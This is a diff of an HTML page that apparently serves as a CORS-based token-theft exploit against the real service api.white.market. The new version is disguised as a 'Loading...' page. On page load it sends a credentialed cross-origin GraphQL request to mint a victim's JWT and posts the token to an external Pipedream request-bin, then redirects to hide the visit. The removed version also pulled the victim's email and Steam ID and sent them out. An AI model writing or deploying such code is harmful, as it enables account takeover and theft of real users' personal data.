@@ -1,123 +1,66 @@
 <!DOCTYPE html>
 <html>
-<head><title>White Market - Final Attack Test</title></head>
+<head><title>White Market</title></head>
 <body>
-<h1>FINAL ATTACK TEST</h1>
-<button onclick="attack()" style="padding: 20px; font-size: 18px; background: red; color: white; border: none; cursor: pointer;">
-    🚨 TEST FULL ATTACK NOW 🚨
-</button>
+<h1>Loading...</h1>
 <pre id="output"></pre>
 
 <script>
 const output = document.getElementById('output');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
 
-async function attack() {
-    output.textContent = '=== ATTACKING ===\n\n';
+output.textContent = 'Sending CORS request to steal JWT...\n\n';
+
+fetch('https://api.white.market/graphql/api', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/json',
+        'x-accept-language': 'en_US'
+    },
+    body: JSON.stringify({
+        query: "\n  mutation AuthToken {\n    auth_token {\n      accessToken\n    }\n  }\n",
+        operationName: "AuthToken"
+    })
+})
+.then(r => {
+    output.textContent += `Response status: ${r.status}\n\n`;
+    return r.json();
+})
+.then(data => {
+    output.textContent += `Response:\n${JSON.stringify(data, null, 2)}\n\n`;
     
-    // Step 1: Try to generate JWT via auth_token mutation
-    output.textContent += 'Step 1: Attempting to steal refresh token and generate JWT...\n';
-    
-    try {
-        const jwtResponse = await fetch('https://api.white.market/graphql/api', {
+    if (data.data && data.data.auth_token) {
+        output.textContent += '✅ SUCCESS - JWT STOLEN!\n\n';
+        output.textContent += `JWT:\n${data.data.auth_token.accessToken}\n\n`;
+        
+        // Exfiltrate
+        fetch(REQUESTBIN, {
             method: 'POST',
-            credentials: 'include',
-            headers: {
-                'Content-Type': 'application/json',
-                'x-accept-language': 'en_US'
-            },
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                query: `
-                    mutation AuthToken {
-                        auth_token {
-                            accessToken
-                        }
-                    }
-                `,
-                operationName: 'AuthToken'
+                attack: 'JWT_STOLEN',
+                jwt: data.data.auth_token.accessToken,
+                timestamp: new Date().toISOString()
             })
         });
         
-        const jwtData = await jwtResponse.json();
-        output.textContent += `Response: ${JSON.stringify(jwtData, null, 2)}\n\n`;
+        output.textContent += '✅ Sent to RequestBin\n';
         
-        if (jwtData.data && jwtData.data.auth_token) {
-            output.textContent += '✅✅✅ SUCCESS! JWT STOLEN! ✅✅✅\n\n';
-            const jwt = jwtData.data.auth_token.accessToken;
-            output.textContent += `JWT: ${jwt}\n\n`;
-            
-            // Exfiltrate to RequestBin
-            fetch(REQUESTBIN, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    attack: 'FULL_ACCOUNT_TAKEOVER_SUCCESS',
-                    jwt: jwt,
-                    timestamp: new Date().toISOString(),
-                    note: 'Persistent JWT stolen via CORS + token refresh cookie'
-                })
-            });
-            
-            // Step 2: Use the JWT to fetch victim data
-            output.textContent += 'Step 2: Using stolen JWT to fetch victim profile...\n';
-            
-            const profileResponse = await fetch('https://api.white.market/graphql/api', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'authorization': `Bearer ${jwt}`,
-                    'x-accept-language': 'en_US'
-                },
-                body: JSON.stringify({
-                    query: `
-                        query PersonProfile {
-                            person: person_profile {
-                                id
-                                email
-                                steamId
-                                steamName
-                            }
-                        }
-                    `,
-                    operationName: 'PersonProfile'
-                })
-            });
-            
-            const profileData = await profileResponse.json();
-            output.textContent += `\nVictim Profile:\n${JSON.stringify(profileData, null, 2)}\n\n`;
-            
-            if (profileData.data && profileData.data.person) {
-                output.textContent += `✅ VICTIM IDENTIFIED:\n`;
-                output.textContent += `  Email: ${profileData.data.person.email}\n`;
-                output.textContent += `  Steam ID: ${profileData.data.person.steamId}\n`;
-                output.textContent += `  Steam Name: ${profileData.data.person.steamName}\n\n`;
-                
-                fetch(REQUESTBIN, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        attack: 'VICTIM_DATA_EXFILTRATED',
-                        victim: profileData.data.person,
-                        jwt: jwt,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-            }
-            
-            output.textContent += '\n🎯 ATTACK COMPLETE - FULL ACCOUNT TAKEOVER ACHIEVED 🎯\n';
-            
-        } else if (jwtData.errors) {
-            output.textContent += '❌ JWT generation failed:\n';
-            jwtData.errors.forEach(err => {
-                output.textContent += `  ${err.message}\n`;
-            });
-            output.textContent += '\n(You probably need to login via Steam first)\n';
-        }
-        
-    } catch (e) {
-        output.textContent += `❌ ERROR: ${e.message}\n`;
+    } else if (data.errors) {
+        output.textContent += '❌ Error:\n';
+        data.errors.forEach(err => {
+            output.textContent += `  ${err.message}\n`;
+        });
     }
-}
+    
+    setTimeout(() => {
+        window.location.href = 'https://white.market';
+    }, 3000);
+})
+.catch(e => {
+    output.textContent += `❌ Request failed: ${e.message}\n`;
+});
 </script>
 </body>
 </html>
